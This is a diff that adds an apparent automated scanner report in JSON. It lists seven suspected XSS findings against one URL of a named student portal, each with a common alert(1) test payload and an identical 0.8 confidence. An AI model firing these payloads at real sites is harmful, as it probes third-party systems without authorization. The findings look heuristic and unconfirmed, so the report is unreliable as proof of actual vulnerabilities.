@@ -1,0 +1,55 @@
+{
+  "target": "https://student.bennetterp.camu.in",
+  "date": "2025-04-20",
+  "vulnerabilities": [
+    {
+      "type": "XSS",
+      "url": "https://student.bennetterp.camu.in/v2/?id=663474b11dd0e9412a1f793f",
+      "payload": "<script>alert(1)</script>",
+      "confidence": 0.8,
+      "timestamp": 1745087402.178638
+    },
+    {
+      "type": "XSS",
+      "url": "https://student.bennetterp.camu.in/v2/?id=663474b11dd0e9412a1f793f",
+      "payload": "<img src=x onerror=alert(1)>",
+      "confidence": 0.8,
+      "timestamp": 1745087402.216078
+    },
+    {
+      "type": "XSS",
+      "url": "https://student.bennetterp.camu.in/v2/?id=663474b11dd0e9412a1f793f",
+      "payload": "\" onmouseover=alert(1) \"",
+      "confidence": 0.8,
+      "timestamp": 1745087402.257071
+    },
+    {
+      "type": "XSS",
+      "url": "https://student.bennetterp.camu.in/v2/?id=663474b11dd0e9412a1f793f",
+      "payload": "<svg/onload=alert(1)>",
+      "confidence": 0.8,
+      "timestamp": 1745087402.3039
+    },
+    {
+      "type": "XSS",
+      "url": "https://student.bennetterp.camu.in/v2/?id=663474b11dd0e9412a1f793f",
+      "payload": "javascript:alert(1)",
+      "confidence": 0.8,
+      "timestamp": 1745087402.386346
+    },
+    {
+      "type": "XSS",
+      "url": "https://student.bennetterp.camu.in/v2/?id=663474b11dd0e9412a1f793f",
+      "payload": "\"><script>alert(1)</script>",
+      "confidence": 0.8,
+      "timestamp": 1745087402.467198
+    },
+    {
+      "type": "XSS",
+      "url": "https://student.bennetterp.camu.in/v2/?id=663474b11dd0e9412a1f793f",
+      "payload": "\"><iframe src=\"javascript:alert(1)\">",
+      "confidence": 0.8,
+      "timestamp": 1745087402.535263
+    }
+  ]
+}
